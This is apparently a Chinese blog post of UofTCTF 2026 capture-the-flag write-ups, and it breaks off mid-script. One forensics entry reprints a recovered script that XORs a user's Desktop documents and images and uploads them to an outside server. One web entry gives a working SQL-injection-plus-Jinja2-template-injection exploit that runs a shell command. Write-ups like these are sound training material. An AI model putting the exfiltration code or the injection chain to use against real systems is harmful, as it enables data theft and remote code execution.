---
title: 2026UofTCTF
slug: 2026uoftctf-zv00ly
url: /post/2026uoftctf-zv00ly.html
date: '2026-01-11 18:30:20+08:00'
lastmod: '2026-01-13 22:15:47+08:00'
categories:
  - CTF-Writeup
description: 时间太仓促了，刚好在路上，很多没来得及看hhh
toc: true
isCJKLanguage: true
---



# 2026UofTCTF

# Misc

## Reverse Wordle | 状态:solved｜Live

### 题目描述

My friend said they always use the same starting word, can you help me find out what it is?

Submit the sha256 hash of the ALL CAPS word wrapped in the flag format uoftctf{...}

### WriteUp

把三局的“第一行反馈”分别用三局答案去约束（1\=REBUT，67\=CRASS，1336\=DITTY）后，在官方可猜词表里唯一能同时满足三组反馈的起手词是：SQUIB。

- Wordle 1 答案：REBUT
- Wordle 67 答案：CRASS
- Wordle 1336 答案：DITTY

对 ALL CAPS 的 SQUIB 做 SHA-256 得到：64b28ded00856c89688f8376f58af02dc941535cbb0b94ad758d2a77b2468646

所以正确提交是：

**uoftctf{64b28ded00856c89688f8376f58af02dc941535cbb0b94ad758d2a77b2468646}**

## Encryption Service | 状态:running｜Reproduction

### 题目描述

We made an encryption service. We forgot to make the decryption though. As compensation we are giving free encrypted flags

​`nc 34.86.4.154 5000`​

### WriteUp

奇怪的漏洞点，很新鲜，没见过，再看看

## Guess The Number | 状态:solved｜Live

### 题目描述

Guess my super secret number

​`nc 35.231.13.90 5000`​

### WriteUp

单纯的猜测，在未知量是 100 bit，每次询问只回 Yes/No，最多 1 bit 信息。50 次最多 50 bit 信息，不够唯一确定 x。

因此需要构造延时条件做侧信道

这里构造了以下两个延时组件：

```python
delay_true_expr  = (2 ** DELAY_EXP) > 0   # 计算很慢，但结果恒 True
delay_false_expr = (2 ** DELAY_EXP) < 0   # 计算很慢，但结果恒 False

```

Python 的 and/or 是短路的：A and B：如果 A 为 False，B 根本不会算，A or B：如果 A 为 True，B 根本不会算，而evaluate() 里写的就是 Python 原生的 and/or，所以短路同样成立。

本地很快就通了，但是远程一直不行，网络背大锅，导致一直调大参数

```python
import pwn
import time
import sys

# Set logging level
pwn.context.log_level = 'info'

def solve():
    if len(sys.argv) > 2:
        host = sys.argv[1]
        port = int(sys.argv[2])
    else:
        host = "35.231.13.90"
        port = 5000

    pwn.log.info(f"Connecting to {host}:{port}")
    io = pwn.remote(host, port)

    DELAY_EXP = 80000000
    TIME_THRESHOLD = 2.5
    
    # Range [L, R)
    L = 0
    R = 1 << 100
    
    # Delay expressions
    # DelayTrue: Returns True, Slow
    # DelayFalse: Returns False, Slow
    delay_true_expr = {'op': '>', 'arg1': {'op': '**', 'arg1': 2, 'arg2': DELAY_EXP}, 'arg2': 0}
    delay_false_expr = {'op': '<', 'arg1': {'op': '**', 'arg1': 2, 'arg2': DELAY_EXP}, 'arg2': 0}

    for i in range(50):
        size = R - L
        pwn.log.info(f"Round {i}: Range=[{L}, {R}) size={size}")
        
        if size <= 1:
            # Burn remaining rounds
            pwn.log.info("Found number (or close enough), burning rounds")
            io.sendlineafter(b': ', b'1')
            io.recvline()
            continue
            
        # Calculate cut points
        M1 = L + (size * 1) // 4
        M2 = L + (size * 2) // 4
        M3 = L + (size * 3) // 4
        
        # Logic:
        # Query = ( (x >= M2) and ( (x < M3) or DelayTrue ) ) or ( (x >= M1) and DelayFalse )
        
        # Construct parts
        # P1 = (x >= M2)
        p1 = {'op': '>=', 'arg1': 'x', 'arg2': M2}
        
        # P2 = (x < M3) or DelayTrue
        p2 = {'op': 'or', 'arg1': {'op': '<', 'arg1': 'x', 'arg2': M3}, 'arg2': delay_true_expr}
        
        # Left Side = P1 and P2
        left_side = {'op': 'and', 'arg1': p1, 'arg2': p2}
        
        # P3 = (x >= M1)
        p3 = {'op': '>=', 'arg1': 'x', 'arg2': M1}
        
        # Right Side = P3 and DelayFalse
        right_side = {'op': 'and', 'arg1': p3, 'arg2': delay_false_expr}
        
        # Full Query = Left Side or Right Side
        query = {'op': 'or', 'arg1': left_side, 'arg2': right_side}
        
        # Send and measure
        # Wait for prompt to ensure clean timing
        io.readuntil(b': ')
        
        start = time.time()
        io.sendline(str(query).encode())
        res = io.recvline().decode().strip()
        end = time.time()
        
        duration = end - start
        is_slow = duration > TIME_THRESHOLD
        is_yes = (res == "Yes!")
        
        pwn.log.info(f"Time={duration:.4f}s (Slow={is_slow}), Response={res}")
        
        # Determine Interval
        # False, Fast -> Q0: [L, M1)
        # False, Slow -> Q1: [M1, M2)
        # True, Fast  -> Q2: [M2, M3)
        # True, Slow  -> Q3: [M3, R)
        
        if not is_yes and not is_slow:
            # Q0
            R = M1
            pwn.log.info("Inferred: Q0 (False, Fast)")
        elif not is_yes and is_slow:
            # Q1
            L = M1
            R = M2
            pwn.log.info("Inferred: Q1 (False, Slow)")
        elif is_yes and not is_slow:
            # Q2
            L = M2
            R = M3
            pwn.log.info("Inferred: Q2 (True, Fast)")
        elif is_yes and is_slow:
            # Q3
            L = M3
            pwn.log.info("Inferred: Q3 (True, Slow)")
        
    # Final guess
    pwn.log.info(f"Final Range: [{L}, {R})")
    guess = L
    pwn.log.info(f"Guessing: {guess}")
    
    io.sendlineafter(b'Guess the number: ', str(guess).encode())
    
    # Read flag
    result = io.recvall().decode()
    print(result)

if __name__ == "__main__":
    solve()

```

![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20260111233331-ywx6h5h.png)

## Lottery | 状态:running｜Reproduction

### 题目描述

Han Shangyan quietly gives away all his savings to protect someone he cares about, leaving himself with nothing. Now broke, his only hope is chance itself.

Can you help Han Shangyan win the lottery?

​`nc 35.245.30.212 5000`​

### WriteUp

暂无

## K&K Training Room | 状态:running｜Reproduction

### 题目描述

Welcome to the K&K Training Room. Before every match, players must check in through the bot.

A successful check in grants the K&K role, opening access to team channels and match coordination.

[https://discord.gg/3u6V8uAGm7](https://discord.gg/3u6V8uAGm7)

### WriteUp

暂无

## File Upload | 状态:running｜Reproduction

### 题目描述

Upload and download files

### WriteUp

暂无

## Vibe Code | 状态:running｜Reproduction

### 题目描述

AI is so ubiquitous in CTF, so I am forcing you to use it to solve this easy C jail.

​`nc 34.23.133.46 5000`​

### WriteUp

暂无

## Nothing Ever Changes | 状态:running｜Reproduction

### 题目描述

While conducting her research on artificial intelligence, Tong Nian claims to have found a way to create adversarial examples without changing anything at all. Her colleagues are skeptical. Can you help her hash out the details of her approach and verify its validity?

Try it out [here](http://35.245.68.223:5000/health)!

### WriteUp

暂无

# OSINT

## Go Go Coaster! | 状态:solved｜Live

### 题目描述

During an episode of Go Go Squid!, Han Shangyan was too scared to go on a roller coaster. What's the English name of this roller coaster? Also, what's its height in whole feet?

Flag format: uoftctf{Coaster\_Name\_HEIGHT}

Example: uoftctf{Yukon\_Striker\_999}

Notes:

1. Flag is case-insenstive, just remember to replace spaces with underscores and no decimal points

### WriteUp

《亲爱的，热爱的》（Go Go Squid!）第 12 集去的 **上海欢乐谷**里那台“主角认证的恐怖级跌落式过山车（近 90 度垂直俯冲）”。

这台过山车在英文资料里的名称就是：

- ​**Diving Coaster**（地点：Happy Valley Shanghai / 上海欢乐谷）
- 高度：​**65 m**，折合 ​**约 213 英尺**（whole feet 取 213）。

```bash
uoftctf{Diving_Coaster_213}
```

## Go Go Cabinet! | 状态:running｜Reproduction

### 题目描述

I really like Go Go Squid! In fact, I like it so much that I even bought the same model of cabinet that is in the series!

Can you find:

1. The first and last name of the designer of this cabinet?
2. The episode and timestamp that this cabinet first appears at all in the series on YouTube?

Flag format: uoftctf{First\_Last\_EpisodeNum\_MM:SS}

Example: uoftctf{John\_Doe\_06\_07:27}

Notes:

1. Mind the flag format/example :)
2. There is a 1-second fowards leniency in the timestamp (if 1:00 is correct, then 1:01 is correct)

### WriteUp

暂无

## My Shikishi is Fake! | 状态:running｜Reproduction

### 题目描述

After the whole incident with Pokemon cards, Han Shangyan decided to buy Tong Nian shikishis autographed by famous manga artists instead. He came across this seller with autographs and sketches done by creators of Dragon Ball, Chainsaw Man, and more, all with certificates of authenticity and money-back guarantees! Surely this is too good to be true?

Turns out that this particular brand of high-quality fakes have been in production for over a decade, spanning multiple platforms, sellers, and authentication company names, though one name is always constant: the appraiser's.

What you will need to find:

1. First and last name of the appraiser in Japanese (how it appears on the certificate).
2. Email that is tied to one of the organizations that the certificate is issued by.
3. The year that they were reborn and started to expand the scope of their activities.
4. PSA did another oopsie authenticating one of these fakes, a shikishi of Draken and Mikey, which a foreigner unfortunately bought and posted. Find its certification number.

The flag format will be uoftctf{JPNAME\_EMAIL\_YEAR\_CERT}

Example: uoftctf{山田太郎\_example@example.com\_9999\_AA99999}

Notes:

1. OSINTing the author will not help, though you are free to do so.
2. Flag is case-sensitive.

### WriteUp

暂无

## T1 | 状态:solved/running｜Reproduction

### 题目描述

Han Shangyan wanted to buy an autographed Pokemon card for Tong Nian. Unfortunately, he found out that it was fake! He wants to find out more about this forger, but they have deleted the auction! Can you help him put a stop to this 2-year-long scheme?

[https://auctions.yahoo.co.jp/jp/auction/t1101312767](https://auctions.yahoo.co.jp/jp/auction/t1101312767)

What you will need to find:

1. The link to the forger's Yahoo Japan Auctions profile
2. The link to the forger's Mercari profile, where they still sell similar forgeries to this day
3. One of the seller's forgeries of the same Pokemon artist as the forgery in the link given was graded and authenticated with PSA (most trustworthy grading service btw)! Find how much yen it sold for originally.
4. The first and last name of the Pokemon artist of the first autograph in the PSA submission that the forger submitted that contains the card from (3).
5. Finally, the forger copied the card from (3) from a real signing event to make it look real. What Pokemon artist was first to autograph in that event? Get their twitter username.

The flag format will be uoftctf{URL1\_URL2\_AMT\_FIRSTNAME\_LASTNAME\_USERNAME}

Copy the full URLs.

Example: uoftctf{[https://auctions.yahoo.co.jp/seller/fhrh2HFHdqw229nrr34r89jdg_https://jp.mercari.com/user/profile/999999_99999_John_Doe_example}](https://auctions.yahoo.co.jp/seller/fhrh2HFHdqw229nrr34r89jdg_https://jp.mercari.com/user/profile/999999_99999_John_Doe_example%7D)

Notes:

1. OSINTing the author will not help you, though you are free to do so.
2. Flag is case-insensitive.

### WriteUp

暂无

# Forensics

## Baby Exfil | 状态:solved｜Live

### 题目描述

Team K&K has identified suspicious network activity on their machine. Fearing that a competing team may be attempting to steal confidential data through underhanded means, they need your help analyzing the network logs to uncover the truth.

### WriteUp

翻找流量找到了恶意脚本

```python
import os
import requests

key = "G0G0Squ1d3Ncrypt10n"
server = "http://34.134.77.90:8080/upload"

def xor_file(data, key):
    result = bytearray()
    for i in range(len(data)):
        result.append(data[i] ^ ord(key[i % len(key)]))
    return bytes(result)

base_path = r"C:\Users\squid\Desktop"
extensions = ['.docx', '.png', ".jpeg", ".jpg"]

for root, dirs, files in os.walk(base_path):
    for file in files:
        if any(file.endswith(ext) for ext in extensions):
            filepath = os.path.join(root, file)
            try:
                with open(filepath, 'rb') as f:
                    content = f.read()
                
                encrypted = xor_file(content, key)
                hex_data = encrypted.hex()
                requests.post(server, files={'file': (file, hex_data)})
                
                print(f"Sent: {file}")
            except:
                pass

```

从流57开始可以找到几个upload接口的记录

![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20260111214927-ob671qr.png)

然后提取逆向即可

```python
import scapy.all as scapy
import re
import os

PCAP_FILE = '/Users/joker/Code/2026Uoftctf/Forensics/final.pcapng'
KEY = "G0G0Squ1d3Ncrypt10n"
OUTPUT_DIR = '/Users/joker/Code/2026Uoftctf/Forensics/extracted'

if not os.path.exists(OUTPUT_DIR):
    os.makedirs(OUTPUT_DIR)

def xor_file(data, key):
    result = bytearray()
    for i in range(len(data)):
        result.append(data[i] ^ ord(key[i % len(key)]))
    return bytes(result)

print(f"Reading {PCAP_FILE}...")
try:
    packets = scapy.rdpcap(PCAP_FILE)
    print(f"Read {len(packets)} packets.")
except Exception as e:
    print(f"Error reading pcap: {e}")
    exit(1)

# Target: 34.134.77.90:8080
target_ip = "34.134.77.90"
target_port = 8080

# Organize packets by TCP stream
streams = {}

for pkt in packets:
    if scapy.TCP in pkt and scapy.IP in pkt:
        ip = pkt[scapy.IP]
        tcp = pkt[scapy.TCP]
        
        if ip.dst == target_ip and tcp.dport == target_port:
            stream_key = (ip.src, tcp.sport, ip.dst, tcp.dport)
            if stream_key not in streams:
                streams[stream_key] = []
            streams[stream_key].append(pkt)

print(f"Found {len(streams)} streams to target.")

for stream_key, stream_packets in streams.items():
    # Sort by sequence number to handle out-of-order
    stream_packets.sort(key=lambda p: p[scapy.TCP].seq)
    unique_packets = []
    seen_seqs = set()
    for p in stream_packets:
        seq = p[scapy.TCP].seq
        # We also need to consider payload length, but simple seq check helps
        if seq not in seen_seqs:
            unique_packets.append(p)
            seen_seqs.add(seq)
    
    # Reassemble payload
    full_payload = b""
    for p in unique_packets:
        if scapy.Raw in p:
            full_payload += p[scapy.Raw].load
    
    print(f"Stream {stream_key}: {len(stream_packets)} packets, payload size: {len(full_payload)}")
    if len(full_payload) > 0:
        print(f"  Head: {full_payload[:50]}")

    if len(full_payload) > 0:
        # Check if it looks like a multipart body (starts with --)
        # OR contains POST /upload
        if b"POST /upload" in full_payload:
            print(f"Processing stream {stream_key} (Found POST header)")
            # Try to find boundary in headers
            boundary_match = re.search(rb'Content-Type: multipart/form-data; boundary=(.+?)\r\n', full_payload)
            if boundary_match:
                boundary = boundary_match.group(1)
            else:
                # Fallback: try to find boundary from body start
                # Look for first line starting with --
                match = re.search(rb'(--[a-zA-Z0-9]+)\r\n', full_payload)
                if match:
                    boundary = match.group(1)[2:] # strip --
                else:
                    print("  No boundary found.")
                    continue
        elif full_payload.startswith(b'--'):
            print(f"Processing stream {stream_key} (Found Body start)")
            # Extract boundary from first line
            first_line_end = full_payload.find(b'\r\n')
            if first_line_end != -1:
                boundary = full_payload[2:first_line_end]
            else:
                print("  Cannot parse boundary.")
                continue
        else:
            continue
            
        print(f"  Boundary: {boundary}")
        
        # Split by boundary
        # The body parts are separated by --boundary
        parts = full_payload.split(b'--' + boundary)
        
        for part in parts:
            if b'filename="' in part:
                # Extract filename
                filename_match = re.search(rb'filename="(.+?)"', part)
                if filename_match:
                    filename = filename_match.group(1).decode('utf-8', errors='ignore')
                    
                    # Extract content
                    # Look for double CRLF
                    header_end = part.find(b'\r\n\r\n')
                    if header_end != -1:
                        # The content ends with \r\n before the next boundary, 
                        # but split() removed the next boundary.
                        # However, the part string might end with \r\n (or \r\n--)
                        # The split consumes '--boundary', but the preceding \r\n is part of the 'part' string usually?
                        # Actually, multipart format is:
                        # --boundary\r\nHeaders\r\n\r\nBody\r\n--boundary
                        
                        # So 'part' will start with \r\nHeaders... and end with \r\n
                        
                        body = part[header_end+4:]
                        # Trim trailing \r\n
                        if body.endswith(b'\r\n'):
                            body = body[:-2]
                        
                        # The body is the hex string
                        try:
                            hex_str = body.decode('ascii').strip()
                            # It might be very long
                            print(f"  Found file: {filename}, hex length: {len(hex_str)}")
                            
                            encrypted_bytes = bytes.fromhex(hex_str)
                            decrypted_bytes = xor_file(encrypted_bytes, KEY)
                            
                            save_path = os.path.join(OUTPUT_DIR, os.path.basename(filename))
                            with open(save_path, 'wb') as f:
                                f.write(decrypted_bytes)
                            print(f"  Success: Saved to {save_path}")
                            
                        except Exception as e:
                            print(f"  Failed to process {filename}: {e}")

```

在其中一张图里找到了flag

![image](http://127.0.0.1:50211/assets/image-20260111215009-essj4un.png)

```bash
uoftctf{b4by_w1r3sh4rk_an4lys1s}
```

## My Pokemon Card is Fake! | 状态:running｜Reproduction

### 题目描述

Han Shangyan noticed that recently, Tong Nian has been getting into Pokemon cards. So, what could be a better present than a literal prototype for the original Charizard? Not only that, it has been authenticated and graded a PRISTINE GEM MINT 10 by CGC!!!

Han Shangyan was able to talk the seller down to a modest 6-7 figure sum (not kidding btw), but when he got home, he had an uneasy feeling for some reason. Can you help him uncover the secrets that lie behind these cards?

What you will need to find:

1. Date and time (relative to the printer, and 24-hour clock) that it was printed.
2. Printer's serial number.

The flag format will be uoftctf{YYYY\_MM\_DD\_HH:MM\_SERIALNUM}

Example: uoftctf{9999\_09\_09\_23:59\_676767676}

Notes:

1. You're free to dig more into the whole situation after you've solved the challenge, it's very interesting, though so much hasn't been or can't be said :(
2. Two days after I write this challenge, I'm going to meet the person whose name was used for all this again. Hopefully I'll be back to respond to tickets!!!

### WriteUp

暂无

# Web

## No Quotes | 状态:solved｜Live

### 题目描述

Unless it's from "Go Go Squid!", no quotes are allowed here! Let this wholesome quote heal your soul:

Ai Qing: "If you didn't know about robot combat back then, what would you be doing?"

Wu Bai: "There's no if. As long as you're here, I'll be here."

### WriteUp

```python
import requests
import sys

# Configuration
TARGET_URL = "http://localhost:5001"
if len(sys.argv) > 1:
    TARGET_URL = sys.argv[1]

if not TARGET_URL.startswith("http://") and not TARGET_URL.startswith("https://"):
    TARGET_URL = "https://" + TARGET_URL

LOGIN_URL = f"{TARGET_URL}/login"
HOME_URL = f"{TARGET_URL}/home"

def solve():
    print(f"[*] Targeting: {TARGET_URL}")

    # SSTI Payload to execute /readflag
    # We use the standard RCE payload for Jinja2
    ssti_payload = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('/readflag').read() }}"
    
    # Convert payload to hex for SQL injection (to avoid quotes)
    ssti_hex = "0x" + ssti_payload.encode().hex()
    
    # SQL Injection Payload
    # Username: \  -> Escapes the closing quote, consuming the query up to the next quote
    # Password: UNION SELECT 1, <HEX_PAYLOAD> #
    #
    # Query logic:
    # SELECT ... WHERE username = ('{username}') AND password = ('{password}')
    # With username=\:
    # SELECT ... WHERE username = ('\') AND password = ('{password}')
    # The string literal becomes: ') AND password = (
    # The rest of the query is interpreted as SQL: {password}')
    # We inject UNION SELECT to return our payload as the username.
    
    username = "\\"
    # We need to close the parenthesis opened by "username = ("
    # The backslash consumed the original closing quote and parenthesis into the string.
    # So the query structure is: WHERE username = ( 'string_literal' [INJECTED]
    # We need to add ')' to close it.
    password = f") UNION SELECT 1, {ssti_hex} -- "
    
    print("[*] Sending exploit payload...")
    session = requests.Session()
    data = {
        "username": username,
        "password": password
    }
    
    response = session.post(LOGIN_URL, data=data)
    
    if response.status_code == 200 and "Invalid credentials" in response.text:
        print("[-] Login failed. Exploit might need adjustment.")
        # Debugging output
        # print(response.text)
        return

    # Check if we are redirected or logged in
    # The app returns a redirect on success, requests follows it automatically
    if response.url == HOME_URL or "Welcome," in response.text:
        print("[+] Login successful! Checking for flag...")
        
        # The home page renders the username using render_template_string
        # triggering the SSTI payload.
        if "uoftctf{" in response.text:
            flag = response.text.split("uoftctf{")[1].split("}")[0]
            print(f"[+] Flag found: uoftctf{{{flag}}}")
        else:
            print("[+] Payload executed, but no flag in response.")
            print("Response content:")
            print(response.text)
    else:
        print("[-] Unexpected response.")
        print(f"Status: {response.status_code}")
        print(f"URL: {response.url}")

if __name__ == "__main__":
    solve()

```

## Firewall | 状态:running｜Reproduction

### 题目描述

Free flag at /flag.html

​`curl http://35.227.38.232:5000`​

### WriteUp

暂无

## Personal Blog | 状态:running｜Reproduction

### 题目描述

For your eyes only?

Visit the website [here](http://34.26.148.28:5000/).

### WriteUp

暂无

## No Quotes 2 | 状态:running｜Reproduction

### 题目描述

Unless it's from "Go Go Squid!", no quotes are allowed here! Let this wholesome quote heal your soul:

Ai Qing: "If you didn't know about robot combat back then, what would you be doing?"

Wu Bai: "There's no if. As long as you're here, I'll be here."

Now complete with a double check for extra security!

### WriteUp

暂无

## No Quotes 3 | 状态:running｜Reproduction

### 题目描述

Unless it's from "Go Go Squid!", no quotes are allowed here! Let this wholesome quote heal your soul:

Ai Qing: "If you didn't know about robot combat back then, what would you be doing?"

Wu Bai: "There's no if. As long as you're here, I'll be here."

Now complete with a double check for extra security AND ​**proper hashing**!

(The author also hates **periods** and is 6'7" btw)

### WriteUp

暂无

## Pasteboard | 状态:running｜Reproduction

### 题目描述

For Team K&K, dating is forbidden. So Mi Shaofei and Sun Yaya hide their relationship the only way they can: by slipping messages into a notes sharing app.

### WriteUp

暂无

## Unrealistic Client-Side Challenge - Flag 1 | 状态:running｜Reproduction

### 题目描述

Han Shangyan was tired of Team K&K getting skill-diffed every time they were faced with client-side web challenges. After some self-reflection, he finally accepted that training his squad solely with aim trainers *might* not be the best approach. Instead, he decided to make a *totally realistic* CTF challenge for his team to practice on.

Submit flag 1 here. Both challenges use the same attachment.

Note: Port 5001 is not exposed on the remote instance. However, the bot can still access it and this does not interfere with the intended solution.

### WriteUp

暂无

## Vulnerability Research | 状态:running｜Reproduction

### 题目描述

Inspired by the recent **10.0 CVSS** react2shell vulnerability, Han Shangyan decided to embark on a web application framework auditing journey himself. He stumbled upon this old web framework. Can you help him audit it for any bugs?

Note: This challenge involves exploiting a real 0-day. Please refrain from posting writeups or sharing details about the vulnerability publicly until it has been patched by the maintainers.

### WriteUp

暂无

## Unrealistic Client-Side Challenge - Flag 2 | 状态:running｜Reproduction

### 题目描述

Han Shangyan was tired of Team K&K getting skill-diffed every time they were faced with client-side web challenges. After some self-reflection, he finally accepted that training his squad solely with aim trainers *might* not be the best approach. Instead, he decided to make a *totally realistic* CTF challenge for his team to practice on.

Submit flag 2 here. Both challenges use the same attachment.

Note: Port 5001 is not exposed on the remote instance. However, the bot can still access it and this does not interfere with the intended solution.

### WriteUp

暂无

# Rev

## Baby (Obfuscated) Flag Checker | 状态:solved｜Live

### 题目描述

All this obfuscation has left Han Shangyan seeing double. Even Grunt refuses to untangle this mess for him, so it's up to you to do the real *grunt*work (hahaha get it???).

Hint: This challenge can be solved without fully deobfuscating the script, but writing a deobfuscator might help you with the "ML Connoisseur" challenge...

### WriteUp

```python

def lcg_random(seed):
    state = seed
    while True:
        # Based on GGs logic:
        # if g0gOSqu1D == 853: ... return G0Gosqu1D * 1103515245 + 12345 & 2147483647
        return (state * 1103515245 + 12345) & 2147483647

def get_permutation(n):
    # Based on Ggs logic
    state = 195936478 # GGs_675671 initial value
    items = list(range(n))
    result = []
    while items:
        state = lcg_random(state)
        idx = state % len(items)
        result.append(items.pop(idx))
    return result

def get_expected_chunk(idx):
    # G0gosQu1D data
    ENCRYPTED_CHUNKS = [
        [13, 73, 41, 30, 53, 34], 
        [8, 18, 27, 9, 30, 9, 27, 6, 25, 76, 25, 34], 
        [37, 57, 66, 66, 66, 0], 
        [25, 78, 63, 8, 58, 34], 
        [77, 19, 78, 34, 14, 21, 77, 74, 34], 
        [73, 19, 34, 76, 49, 48, 34], 
        [15, 78, 11, 34, 77, 15, 34], 
        [9, 21, 76, 72, 34, 10, 76, 74, 21, 34], 
        [4, 77, 8, 34, 16, 77, 19, 22, 78, 36, 34]
    ]
    key = 125 # (90 ^ 60) + 23 & 255
    return "".join(chr(c ^ key) for c in ENCRYPTED_CHUNKS[idx])

def get_chunk_position(target_idx):
    CHUNK_LENGTHS = [6, 12, 6, 6, 9, 7, 7, 10, 11] # sQU1D
    CHUNK_ORDER = [1, 8, 0, 3, 6, 4, 7, 5, 2] # SqUId
    
    pos = 0
    for idx in CHUNK_ORDER:
        if idx == target_idx:
            return pos
        pos += CHUNK_LENGTHS[idx]
    return pos

def solve():
    perm = get_permutation(9)
    print(f"Permutation: {perm}")
    
    # Flag length is 74 (checked in line 197)
    flag_chars = [''] * 74
    
    for idx in perm:
        chunk = get_expected_chunk(idx)
        pos = get_chunk_position(idx)
        print(f"Chunk {idx}: '{chunk}' at pos {pos}")
        
        for i, c in enumerate(chunk):
            if pos + i < 74:
                flag_chars[pos + i] = c
            else:
                print(f"Error: Index out of bounds {pos+i}")
                
    print("Flag:", "".join(flag_chars))

if __name__ == "__main__":
    solve()

```

## Bring Your Own Program | 状态:running｜Reproduction

### 题目描述

Team K&K discovered a mysterious emulator for an unknown architecture. I wonder what kind of programs it can run...

​`nc 35.245.96.82 5000`​

### WriteUp

暂无

## Symbol of Hope | 状态:running｜Reproduction

### 题目描述

Like a beacon in the dark, Go Go Squid! stands as a symbol of hope to those who seek to be healed.

### WriteUp

暂无

## Will u Accept Some Magic? | 状态:running｜Reproduction

### 题目描述

How does Kotlin compile to wasm so well? Where did my heap go?

Wrap the password in uoftctf{}

### WriteUp

暂无

## ML Connoisseur | 状态:running｜Reproduction

### 题目描述

Tong Nian is a talented machine learning student. She claims to have built a classifier, but never revealed what it is supposed to recognize. The model behaves oddly, and its purpose is unclear. Can you figure out what it's really classifying?

Download: [https://uoftctf-2026-downloads.uoftctf.org/ml-connoisseur.zip](https://uoftctf-2026-downloads.uoftctf.org/ml-connoisseur.zip)

Example usage: `python chal.py examples/0.png`​

### WriteUp

暂无

# Crypto

## Leaked d | 状态:solved｜Live

### 题目描述

Someone leaked my d, surely generating a new key pair is safe enough.

n1\=144193923737869044259998596038292537217126517072587407189785154961344425600188709243733103713567903690926695626210849582322575275021963176688615503362430255878068025864333805901831356111202249176714839010151878345993886718863579928588098080351940561045688931786378656665718140998014299097023143181095121810219

e1\=65537

d1\=12574092103116126584156918631595005114605155027996964036950457918490065036621732354668884564796078087090438462300608898225025828108557296714458055780952572974382089675780912070693778415852291145766476219909978391880801604060224785419022793121117332853938170749724540897211958251465747669952580590146500249193

e2\=6767671

c\=31703515320997441500407462163885912085193988887521686491271883832485018463764003313655377418478488372329742364292629844576532415828605994734718987367062694340608380583593689052813716395874850039382743513756381017287371000882358341440383454299152364807346068866304481227367259672607408256375720022838698292966

### WriteUp

```python
from Crypto.Util.number import inverse, long_to_bytes
import math

# ================== 已知参数 ==================
n = 144193923737869044259998596038292537217126517072587407189785154961344425600188709243733103713567903690926695626210849582322575275021963176688615503362430255878068025864333805901831356111202249176714839010151878345993886718863579928588098080351940561045688931786378656665718140998014299097023143181095121810219

e1 = 65537
d1 = 12574092103116126584156918631595005114605155027996964036950457918490065036621732354668884564796078087090438462300608898225025828108557296714458055780952572974382089675780912070693778415852291145766476219909978391880801604060224785419022793121117332853938170749724540897211958251465747669952580590146500249193

e2 = 6767671

c = 31703515320997441500407462163885912085193988887521686491271883832485018463764003313655377418478488372329742364292629844576532415828605994734718987367062694340608380583593689052813716395874850039382743513756381017287371000882358341440383454299152364807346068866304481227367259672607408256375720022838698292966

# ================== Step 1: 恢复 φ(n) ==================
k = e1 * d1 - 1

# 尝试分解 k = φ(n) * t
for t in range(1, 1_000_000):
    if k % t != 0:
        continue

    phi = k // t

    # 解二次方程 x^2 - (n - phi + 1)x + n = 0
    s = n - phi + 1
    delta = s * s - 4 * n
    if delta < 0:
        continue

    r = int(math.isqrt(delta))
    if r * r != delta:
        continue

    p = (s + r) // 2
    q = (s - r) // 2

    if p * q == n:
        print("[+] Found factors!")
        break
else:
    raise Exception("Failed to factor n")

# ================== Step 2: 计算新的私钥 d2 ==================
phi = (p - 1) * (q - 1)
d2 = inverse(e2, phi)

# ================== Step 3: 解密 ==================
m = pow(c, d2, n)
print(long_to_bytes(m))

```

## Gambler's Fallacy | 状态:solved｜Live

### 题目描述

can we win a zillion dollars tonight?

algorithms inspired by primedice

​`nc 34.162.20.138 5000`​

### WriteUp

```python

import socket
import re
import random
import hmac
import hashlib
import time
import sys

# Untempering functions
def undo_right_shift_xor(y, shift):
    x = y
    for _ in range(shift, 32, shift):
        x = y ^ (x >> shift)
    return x

def undo_left_shift_xor_mask(y, shift, mask):
    x = y
    for _ in range(shift, 32, shift):
        x = y ^ ((x << shift) & mask)
    return x

def untemper(y):
    y = undo_right_shift_xor(y, 18)
    y = undo_left_shift_xor_mask(y, 15, 0xefc60000)
    y = undo_left_shift_xor_mask(y, 7, 0x9d2c5680)
    y = undo_right_shift_xor(y, 11)
    return y

def calculate_roll(server_seed, client_seed, nonce):
    nonce_client_msg = f"{client_seed}-{nonce}".encode()
    sig = hmac.new(str(server_seed).encode(), nonce_client_msg, hashlib.sha256).hexdigest()
    index = 0
    lucky = int(sig[index*5:index*5+5], 16)
    while (lucky >= 1e6):
        index += 1
        lucky = int(sig[index * 5:index * 5 + 5], 16)
        if (index * 5 + 5 > 129):
            lucky = 9999
            break
    return round((lucky % 1e4) * 1e-2)

class RemoteConnection:
    def __init__(self, host, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((host, port))
        self.buffer = b""

    def read_until(self, delimiter):
        while delimiter.encode() not in self.buffer:
            data = self.s.recv(1024)
            if not data:
                break
            self.buffer += data
        
        if delimiter.encode() in self.buffer:
            pos = self.buffer.find(delimiter.encode()) + len(delimiter)
            result = self.buffer[:pos]
            self.buffer = self.buffer[pos:]
            return result.decode()
        return ""

    def read_line(self):
        while b"\n" not in self.buffer:
            data = self.s.recv(1024)
            if not data:
                if self.buffer: # Return remaining buffer as line
                    res = self.buffer
                    self.buffer = b""
                    return res.decode()
                return None
            self.buffer += data
        
        pos = self.buffer.find(b"\n") + 1
        result = self.buffer[:pos]
        self.buffer = self.buffer[pos:]
        return result.decode()

    def send_line(self, line):
        self.s.sendall((line + "\n").encode())

    def close(self):
        self.s.close()

def solve():
    HOST = "34.162.20.138"
    PORT = 5000
    
    print(f"Connecting to {HOST}:{PORT}...")
    conn = RemoteConnection(HOST, PORT)

    # Initial prompt
    print("Reading initial banner...")
    conn.read_until("> ")

    # Step 1: Play 624 games to collect seeds
    print("Step 1: Playing 624 games to collect seeds...")
    conn.send_line("b") # gamble
    conn.read_until("Wager per game (min-wager is") # variable
    conn.read_until(": ")
    conn.send_line("1") # wager 1
    conn.read_until("Number of games (int): ")
    conn.send_line("624") # 624 games
    conn.read_until("Enter your number higher or equal to the roll between 2-98 (prize improves with lower numbers): ")
    conn.send_line("98") # safe bet
    conn.read_until("Do you wish to proceed? (Y/N)")
    conn.send_line("Y")

    # Read output and parse seeds
    server_seeds = []
    
    # We expect 624 lines of game output
    buffer = ""
    while True:
        line = conn.read_line()
        if not line:
            break
        
        # Print progress every 50 lines
